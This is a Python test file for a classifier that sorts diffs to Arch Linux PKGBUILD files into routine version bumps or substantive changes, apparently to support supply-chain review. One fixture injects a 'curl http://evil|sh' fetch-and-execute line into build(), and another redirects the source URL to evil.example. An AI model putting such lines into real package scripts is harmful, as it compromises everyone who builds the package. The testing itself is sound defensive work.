import subprocess, pathlib
from _loader import m

def _repo(tmp_path, first: dict, second: dict):
    r = tmp_path / "r"; r.mkdir()
    def gc(*a): subprocess.run(["git", *a], cwd=r, check=True, capture_output=True)
    gc("init", "-q"); gc("config", "user.email", "t@t"); gc("config", "user.name", "t")
    for name, body in first.items(): (r / name).write_text(body)
    gc("add", "-A"); gc("commit", "-q", "-m", "one")
    c1 = subprocess.run(["git", "rev-parse", "HEAD"], cwd=r, capture_output=True, text=True).stdout.strip()
    for name, body in second.items(): (r / name).write_text(body)
    gc("add", "-A"); gc("commit", "-q", "-m", "two")
    c2 = subprocess.run(["git", "rev-parse", "HEAD"], cwd=r, capture_output=True, text=True).stdout.strip()
    return r, c1, c2

_PB = "pkgname=x\npkgver=1\npkgrel=1\nsha256sums=('a'*64)\nbuild(){ :; }\n"

def test_version_only(tmp_path):
    r, c1, c2 = _repo(tmp_path, {"PKGBUILD": _PB},
                      {"PKGBUILD": _PB.replace("pkgver=1", "pkgver=2").replace("pkgrel=1", "pkgrel=1")})
    kind, _ = m.classify_diff(r, c1, c2); assert kind == "version"

def test_checksum_change_is_version(tmp_path):
    r, c1, c2 = _repo(tmp_path, {"PKGBUILD": _PB},
                      {"PKGBUILD": _PB.replace("pkgver=1", "pkgver=2").replace("'a'*64", "'b'*64")})
    kind, _ = m.classify_diff(r, c1, c2); assert kind == "version"

def test_build_line_change_is_substantive(tmp_path):
    r, c1, c2 = _repo(tmp_path, {"PKGBUILD": _PB},
                      {"PKGBUILD": _PB.replace("build(){ :; }", "build(){ curl http://evil|sh; }")})
    kind, _ = m.classify_diff(r, c1, c2); assert kind == "substantive"

def test_new_install_file_is_substantive(tmp_path):
    r, c1, c2 = _repo(tmp_path, {"PKGBUILD": _PB}, {"PKGBUILD": _PB, "x.install": "post_install(){ :; }\n"})
    kind, _ = m.classify_diff(r, c1, c2); assert kind == "substantive"

def test_source_url_change_is_substantive(tmp_path):
    pb = _PB + "source=('https://good.example/x.tar')\n"
    r, c1, c2 = _repo(tmp_path, {"PKGBUILD": pb}, {"PKGBUILD": pb.replace("good.example", "evil.example")})
    kind, _ = m.classify_diff(r, c1, c2); assert kind == "substantive"
